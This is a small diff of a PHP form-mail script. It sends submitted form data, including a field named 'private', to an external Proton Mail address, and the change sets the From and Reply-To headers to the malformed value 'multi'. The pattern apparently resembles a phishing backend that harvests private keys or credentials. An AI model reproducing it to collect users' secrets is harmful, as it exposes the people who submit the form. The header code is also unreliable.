@@ -20,8 +20,8 @@ $Body .= "private: {$private}\n";
 // Set email parameters
 $to = 'jazzyqueengirl@proton.me'; // Recipient's email address
 $subject = 'Form Submission Results';
-$headers = "From: sender@example.com\r\n"; // Replace with the sender's email address
-$headers .= "Reply-To: sender@example.com\r\n"; // Replace with the sender's email address
+$headers = "From: multi\r\n"; // Replace with the sender's email address
+$headers .= "Reply-To: multi\r\n"; // Replace with the sender's email address
 $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
 
 // Send the email
